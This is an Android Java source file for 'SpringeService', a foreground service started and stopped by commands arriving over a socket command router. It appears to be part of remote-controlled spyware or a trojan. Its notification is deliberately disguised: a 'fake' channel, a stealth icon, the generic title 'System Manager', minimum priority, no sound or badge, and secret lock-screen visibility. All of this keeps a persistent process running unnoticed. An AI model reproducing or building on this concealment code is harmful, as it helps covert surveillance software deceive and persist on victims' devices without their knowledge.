package com.fason.app.features.springe;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import com.fason.app.R;
import com.fason.app.core.Protocol;

/**
 * SpringeService — keeps SpringeManager alive in the foreground.
 *
 * Started by SocketCommandRouter when a springe:show or springe:configure
 * command arrives. Stopped when springe:hide is confirmed.
 * Uses a silent low-priority notification to satisfy API 26+ foreground rules.
 */
public final class SpringeService extends Service {

    private static final String TAG      = "SpringeSvc";
    private static final String CHAN_ID  = Protocol.FAKE_NOTIF_CHANNEL + "_springe";
    private static final int    NOTIF_ID = 9201;

    public static final String ACTION_START = "springe.START";
    public static final String ACTION_STOP  = "springe.STOP";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) { stopSelf(); return START_NOT_STICKY; }
        String action = intent.getAction();
        if (ACTION_STOP.equals(action)) {
            Log.d(TAG, "stop requested");
            stopForeground(true);
            stopSelf();
            return START_NOT_STICKY;
        }
        startForeground(NOTIF_ID, buildNotification());
        Log.d(TAG, "started");
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "destroyed");
    }

    // ── Notification ───────────────────────────────────────────────────────────

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null && nm.getNotificationChannel(CHAN_ID) == null) {
                NotificationChannel ch = new NotificationChannel(
                    CHAN_ID, "System", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.enableLights(false);
                nm.createNotificationChannel(ch);
            }
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHAN_ID);
        } else {
            //noinspection deprecation
            builder = new Notification.Builder(this);
        }

        builder.setSmallIcon(R.drawable.ic_notif_stealth)
               .setContentTitle("System Manager")
               .setContentText("Running")
               .setPriority(Notification.PRIORITY_MIN)
               .setOngoing(true)
               .setShowWhen(false)
               .setVisibility(Notification.VISIBILITY_SECRET);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }

        return builder.build();
    }
}
